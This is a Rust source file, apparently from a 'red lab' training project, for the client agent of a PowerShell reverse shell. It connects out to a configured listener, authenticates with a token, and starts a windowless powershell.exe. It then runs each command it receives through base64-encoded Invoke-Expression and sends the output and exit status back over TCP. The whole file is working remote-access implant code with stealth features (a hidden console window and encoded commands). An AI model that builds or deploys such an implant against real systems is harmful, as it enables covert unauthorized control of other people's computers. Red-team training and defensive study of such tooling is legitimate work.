#![windows_subsystem = "windows"]

use std::io;
use std::net::SocketAddr;
use std::os::windows::process::CommandExt;
use std::process::Stdio;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use base64::Engine as _;
use base64::engine::general_purpose::STANDARD as BASE64;
use powershell_reverse_lab::{
    AGENT_CONFIG_FILE, Frame, FrameKind, client_handshake, listener_address,
    load_optional_adjacent_config, read_frame, session_token, write_frame,
};
use tokio::io::{AsyncRead, AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::net::tcp::OwnedWriteHalf;
use tokio::process::{Child, ChildStdin, Command};
use tokio::sync::mpsc::{self, Receiver, Sender};
use tokio::time::timeout;

const CONNECT_TIMEOUT: Duration = Duration::from_secs(10);
const HANDSHAKE_TIMEOUT: Duration = Duration::from_secs(5);
const COMMAND_TIMEOUT: Duration = Duration::from_secs(120);
const SESSION_IDLE_TIMEOUT: Duration = Duration::from_secs(30 * 60);
const SHUTDOWN_TIMEOUT: Duration = Duration::from_secs(3);
const POWERSHELL_BOOTSTRAP: &[u8] = b"$utf8 = New-Object System.Text.UTF8Encoding($false); [Console]::InputEncoding = $utf8; [Console]::OutputEncoding = $utf8; $OutputEncoding = $utf8\r\n";
const CREATE_NO_WINDOW: u32 = 0x08000000;

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
enum ProcessStream {
    Stdout,
    Stderr,
}

enum ProcessEvent {
    Data(ProcessStream, Vec<u8>),
    Eof(ProcessStream),
    Error(ProcessStream, String),
}

struct MarkerFilter {
    pending: Vec<u8>,
    prefix: Vec<u8>,
    status: Option<i32>,
}

impl MarkerFilter {
    fn new(prefix: &str) -> Self {
        Self {
            pending: Vec::new(),
            prefix: prefix.as_bytes().to_vec(),
            status: None,
        }
    }

    fn push(&mut self, bytes: &[u8]) -> io::Result<Vec<u8>> {
        if self.status.is_some() {
            return Ok(Vec::new());
        }

        self.pending.extend_from_slice(bytes);
        if let Some(marker_start) = find_bytes(&self.pending, &self.prefix) {
            let status_start = marker_start + self.prefix.len();
            if let Some(relative_end) = find_bytes(&self.pending[status_start..], b"__") {
                let status_end = status_start + relative_end;
                let status_text = std::str::from_utf8(&self.pending[status_start..status_end])
                    .map_err(|_| {
                        io::Error::new(io::ErrorKind::InvalidData, "상태 코드가 UTF-8이 아닙니다")
                    })?;
                let parsed_status = status_text.parse::<i32>().map_err(|_| {
                    io::Error::new(
                        io::ErrorKind::InvalidData,
                        format!("잘못된 PowerShell 상태 코드입니다: {status_text}"),
                    )
                })?;

                let output = self.pending[..marker_start].to_vec();
                self.pending.clear();
                self.status = Some(parsed_status);
                return Ok(output);
            }

            if marker_start > 0 {
                return Ok(self.pending.drain(..marker_start).collect());
            }
            return Ok(Vec::new());
        }

        let retained_tail = self.prefix.len().saturating_sub(1);
        if self.pending.len() > retained_tail {
            let output_length = self.pending.len() - retained_tail;
            return Ok(self.pending.drain(..output_length).collect());
        }

        Ok(Vec::new())
    }

    fn take_pending(&mut self) -> Vec<u8> {
        std::mem::take(&mut self.pending)
    }
}

fn find_bytes(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() {
        return Some(0);
    }
    haystack
        .windows(needle.len())
        .position(|window| window == needle)
}

fn session_nonce() -> String {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    format!("{:x}{nanos:x}", std::process::id())
}

fn runtime_settings() -> io::Result<(SocketAddr, String, Option<String>)> {
    if let Some(config) = load_optional_adjacent_config(AGENT_CONFIG_FILE)? {
        let address = config.validate("agent")?;
        return Ok((address, config.token, Some(config.session_id)));
    }

    Ok((listener_address()?, session_token()?, None))
}

fn command_invocation(command: &str, marker_prefix: &str) -> String {
    let encoded = BASE64.encode(command.as_bytes());
    format!(
        "$global:LASTEXITCODE = 0; $global:__red_status = 0; try {{ Invoke-Expression ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{encoded}'))); if (-not $?) {{ $global:__red_status = 1 }} elseif ($global:LASTEXITCODE -ne 0) {{ $global:__red_status = [int]$global:LASTEXITCODE }} }} catch {{ [Console]::Error.WriteLine(($_ | Out-String)); $global:__red_status = 1 }}; [Console]::Out.WriteLine('{marker_prefix}' + $global:__red_status + '__'); [Console]::Error.WriteLine('{marker_prefix}' + $global:__red_status + '__')\r\n"
    )
}

async fn process_reader<R>(mut reader: R, stream: ProcessStream, sender: Sender<ProcessEvent>)
where
    R: AsyncRead + Unpin,
{
    let mut buffer = [0_u8; 4096];
    loop {
        match reader.read(&mut buffer).await {
            Ok(0) => {
                let _ = sender.send(ProcessEvent::Eof(stream)).await;
                return;
            }
            Ok(bytes_read) => {
                if sender
                    .send(ProcessEvent::Data(stream, buffer[..bytes_read].to_vec()))
                    .await
                    .is_err()
                {
                    return;
                }
            }
            Err(error) => {
                let _ = sender
                    .send(ProcessEvent::Error(stream, error.to_string()))
                    .await;
                return;
            }
        }
    }
}

async fn spawn_powershell() -> io::Result<(Child, ChildStdin, Receiver<ProcessEvent>)> {
    let mut child = Command::new("powershell.exe")
        .args(["-NoLogo", "-NoProfile", "-NonInteractive", "-Command", "-"])
        .creation_flags(CREATE_NO_WINDOW)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .kill_on_drop(true)
        .spawn()
        .map_err(|error| {
            io::Error::new(
                error.kind(),
                format!("powershell.exe 실행에 실패했습니다: {error}"),
            )
        })?;

    let mut powershell_stdin = child
        .stdin
        .take()
        .ok_or_else(|| io::Error::other("PowerShell stdin 파이프를 얻지 못했습니다"))?;
    let powershell_stdout = child
        .stdout
        .take()
        .ok_or_else(|| io::Error::other("PowerShell stdout 파이프를 얻지 못했습니다"))?;
    let powershell_stderr = child
        .stderr
        .take()
        .ok_or_else(|| io::Error::other("PowerShell stderr 파이프를 얻지 못했습니다"))?;

    let (event_sender, event_receiver) = mpsc::channel(64);
    tokio::spawn(process_reader(
        powershell_stdout,
        ProcessStream::Stdout,
        event_sender.clone(),
    ));
    tokio::spawn(process_reader(
        powershell_stderr,
        ProcessStream::Stderr,
        event_sender,
    ));

    powershell_stdin.write_all(POWERSHELL_BOOTSTRAP).await?;
    powershell_stdin.flush().await?;

    Ok((child, powershell_stdin, event_receiver))
}

async fn send_output(
    writer: &mut OwnedWriteHalf,
    stream: ProcessStream,
    request_id: u64,
    output: Vec<u8>,
) -> io::Result<()> {
    if output.is_empty() {
        return Ok(());
    }

    let kind = match stream {
        ProcessStream::Stdout => FrameKind::Stdout,
        ProcessStream::Stderr => FrameKind::Stderr,
    };
    write_frame(writer, &Frame::new(kind, request_id, 0, output)).await
}

async fn execute_command(
    request_id: u64,
    command: &str,
    nonce: &str,
    powershell_stdin: &mut ChildStdin,
    events: &mut Receiver<ProcessEvent>,
    socket_writer: &mut OwnedWriteHalf,
) -> io::Result<()> {
    let marker_prefix = format!("__RED_LAB_DONE_{nonce}_{request_id}_");
    let invocation = command_invocation(command, &marker_prefix);
    powershell_stdin.write_all(invocation.as_bytes()).await?;
    powershell_stdin.flush().await?;

    let mut stdout_filter = MarkerFilter::new(&marker_prefix);
    let mut stderr_filter = MarkerFilter::new(&marker_prefix);

    while stdout_filter.status.is_none() || stderr_filter.status.is_none() {
        let event = events.recv().await.ok_or_else(|| {
            io::Error::new(
                io::ErrorKind::UnexpectedEof,
                "PowerShell 출력 채널이 종료되었습니다",
            )
        })?;

        match event {
            ProcessEvent::Data(ProcessStream::Stdout, bytes) => {
                let output = stdout_filter.push(&bytes)?;
                send_output(socket_writer, ProcessStream::Stdout, request_id, output).await?;
            }
            ProcessEvent::Data(ProcessStream::Stderr, bytes) => {
                let output = stderr_filter.push(&bytes)?;
                send_output(socket_writer, ProcessStream::Stderr, request_id, output).await?;
            }
            ProcessEvent::Eof(stream) => {
                let remaining = match stream {
                    ProcessStream::Stdout => stdout_filter.take_pending(),
                    ProcessStream::Stderr => stderr_filter.take_pending(),
                };
                send_output(socket_writer, stream, request_id, remaining).await?;
                return Err(io::Error::new(
                    io::ErrorKind::UnexpectedEof,
                    format!("PowerShell {stream:?}가 명령 완료 전에 종료되었습니다"),
                ));
            }
            ProcessEvent::Error(stream, error) => {
                return Err(io::Error::other(format!(
                    "PowerShell {stream:?} 읽기 실패: {error}"
                )));
            }
        }
    }

    let stdout_status = stdout_filter.status.unwrap_or(1);
    let stderr_status = stderr_filter.status.unwrap_or(1);
    if stdout_status != stderr_status {
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            format!("stdout/stderr 상태 코드 불일치: {stdout_status}/{stderr_status}"),
        ));
    }

    write_frame(
        socket_writer,
        &Frame::new(FrameKind::Exit, request_id, stdout_status, Vec::new()),
    )
    .await
}

async fn terminate_powershell(
    mut child: Child,
    mut powershell_stdin: ChildStdin,
) -> io::Result<()> {
    let _ = powershell_stdin.write_all(b"exit\r\n").await;
    let _ = powershell_stdin.shutdown().await;

    match timeout(SHUTDOWN_TIMEOUT, child.wait()).await {
        Ok(result) => {
            result?;
        }
        Err(_) => {
            child.start_kill()?;
            child.wait().await?;
        }
    }
    Ok(())
}

#[tokio::main]
async fn main() -> io::Result<()> {
    let (address, token, configured_session) = runtime_settings()?;

    if let Some(session_id) = configured_session {
        println!("[RED-LAB] 번들 세션: {session_id}");
    }
    println!("[RED-LAB] 리스너 연결 시도: {address}");
    let mut socket = timeout(CONNECT_TIMEOUT, TcpStream::connect(address))
        .await
        .map_err(|_| io::Error::new(io::ErrorKind::TimedOut, "리스너 연결 시간 초과"))??;
    socket.set_nodelay(true)?;
    timeout(HANDSHAKE_TIMEOUT, client_handshake(&mut socket, &token))
        .await
        .map_err(|_| io::Error::new(io::ErrorKind::TimedOut, "핸드셰이크 시간 초과"))??;
    println!("[RED-LAB] 세션 승인 완료");

    let (child, mut powershell_stdin, mut process_events) = spawn_powershell().await?;
    let nonce = session_nonce();
    let (mut socket_reader, mut socket_writer) = socket.into_split();

    let session_result = loop {
        let frame = match timeout(SESSION_IDLE_TIMEOUT, read_frame(&mut socket_reader)).await {
            Ok(Ok(frame)) => frame,
            Ok(Err(error)) => break Err(error),
            Err(_) => {
                break Err(io::Error::new(
                    io::ErrorKind::TimedOut,
                    "세션 유휴 시간 초과",
                ));
            }
        };

        match frame.kind {
            FrameKind::Command => {
                let command = match String::from_utf8(frame.payload) {
                    Ok(command) => command,
                    Err(error) => break Err(io::Error::new(io::ErrorKind::InvalidData, error)),
                };

                match timeout(
                    COMMAND_TIMEOUT,
                    execute_command(
                        frame.request_id,
                        &command,
                        &nonce,
                        &mut powershell_stdin,
                        &mut process_events,
                        &mut socket_writer,
                    ),
                )
                .await
                {
                    Ok(Ok(())) => {}
                    Ok(Err(error)) => {
                        let _ = write_frame(
                            &mut socket_writer,
                            &Frame::new(
                                FrameKind::Error,
                                frame.request_id,
                                1,
                                error.to_string().into_bytes(),
                            ),
                        )
                        .await;
                        break Err(error);
                    }
                    Err(_) => {
                        let error = io::Error::new(
                            io::ErrorKind::TimedOut,
                            format!("명령 #{} 실행 시간 초과", frame.request_id),
                        );
                        let _ = write_frame(
                            &mut socket_writer,
                            &Frame::new(
                                FrameKind::Error,
                                frame.request_id,
                                1,
                                error.to_string().into_bytes(),
                            ),
                        )
                        .await;
                        break Err(error);
                    }
                }
            }
            FrameKind::Close => break Ok(()),
            unexpected => {
                break Err(io::Error::new(
                    io::ErrorKind::InvalidData,
                    format!("에이전트가 받을 수 없는 프레임입니다: {unexpected:?}"),
                ));
            }
        }
    };

    let shutdown_result = terminate_powershell(child, powershell_stdin).await;
    match (session_result, shutdown_result) {
        (Err(session_error), _) => Err(session_error),
        (Ok(()), Err(shutdown_error)) => Err(shutdown_error),
        (Ok(()), Ok(())) => {
            println!("[RED-LAB] 세션과 PowerShell이 정상 종료되었습니다");
            Ok(())
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn marker_filter_handles_split_marker() {
        let mut filter = MarkerFilter::new("__MARKER_");
        let mut output = Vec::new();
        output.extend(filter.push(b"hello __MAR").expect("first chunk"));
        output.extend(filter.push(b"KER_7__\r\n").expect("second chunk"));

        assert_eq!(output, b"hello ");
        assert_eq!(filter.status, Some(7));
    }

    #[test]
    fn command_is_base64_wrapped_before_powershell() {
        let invocation = command_invocation("Write-Output '테스트'", "__MARKER_");

        assert!(invocation.contains("FromBase64String"));
        assert!(invocation.contains("__MARKER_"));
        assert!(!invocation.contains("Write-Output '테스트'"));
    }
}
